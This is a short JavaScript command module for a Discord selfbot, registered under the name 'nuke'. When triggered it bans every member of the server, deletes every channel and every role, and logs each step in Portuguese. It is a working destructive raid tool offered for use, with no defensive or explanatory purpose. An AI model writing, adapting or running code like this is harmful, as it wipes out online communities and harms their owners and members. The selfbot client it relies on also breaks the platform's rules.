const Skull = require("discord.js-selfbot");
const Rain = new Skull.Client();

module.exports.execute = async (msg, args) => {
    msg.guild.members.cache.map(memb => {
        memb.ban()
        console.log(`Membro Banido: ${memb.username}`)
    })
    msg.guild.channels.cache.map(chan => {
        chan.delete()
        console.log(`Canal Deletado: ${chan.name}`)
    })
    msg.guild.roles.cache.map(role => {
        role.delete()
        console.log(`Role Deletado: ${role.id}`)
    })
}

module.exports.confs = {
    id: '02',
    etc: ['nuke', 'Nuke']
}